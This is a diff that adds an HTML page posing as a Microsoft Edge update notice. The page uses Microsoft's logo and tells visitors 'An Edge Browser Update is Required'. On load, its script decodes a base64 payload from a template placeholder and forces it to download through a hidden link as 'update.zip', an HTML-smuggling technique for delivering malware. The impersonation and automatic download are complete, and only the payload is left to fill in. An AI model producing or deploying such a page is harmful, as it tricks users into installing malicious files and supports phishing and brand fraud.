@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download Page</title>
+    <style>
+        #logo {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+            height: 100vh;
+            background-image: url('https://cdn.wallpaperhub.app/cloudcache/b/1/6/8/7/a/b1687aa62cd54a666dd2c6050593c51b90b52b77.jpg');
+            background-size: cover;
+            background-position: center;
+        }
+        p {
+            text-align: center;
+            font-weight: bold;
+            color: white;
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 10px;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div id="logo"></div>
+    <script>
+        var logoImg = document.createElement('img');
+        logoImg.src = 'https://static.vecteezy.com/system/resources/previews/027/127/592/original/microsoft-logo-microsoft-icon-transparent-free-png.png';
+        logoImg.style.width = '200px';
+        logoImg.style.height = 'auto';
+        logoImg.style.alignSelf = 'center';
+
+        var updateMessageEl = document.createElement('p');
+        updateMessageEl.innerHTML = "An Edge Browser Update is Required";
+
+        var claimEl = document.createElement('p');
+        claimEl.innerHTML = "Your download is starting";
+
+        var logoDiv = document.getElementById('logo');
+
+        // Append the elements in the correct order
+        logoDiv.appendChild(logoImg);
+        logoDiv.appendChild(updateMessageEl); // Add the update message
+        logoDiv.appendChild(claimEl);
+
+        window.onload = function() {
+            function b64toarray(base64) {
+                var bin_string = window.atob(base64);
+                var len = bin_string.length;  
+                var bytes = new Uint8Array(len);
+                for (var i = 0; i < len; i++) {
+                    bytes[i] = bin_string.charCodeAt(i);
+                }
+                return bytes.buffer;
+            }
+            var binary = '{{{BINARY}}}';
+        
+            var data = b64toarray(binary);
+            var blob = new Blob([data], {type: 'application/x-zip-compressed'});
+            var payloadfilename = 'update.zip';
+        
+            var a = document.createElement('a');
+            document.body.appendChild(a);
+            a.style = 'display: none'; 
+            var url = window.URL.createObjectURL(blob);
+            a.href = url;
+            a.download = payloadfilename;
+            a.click();
+            window.URL.revokeObjectURL(url);
+        };
+    </script>
+</body>
+</html>
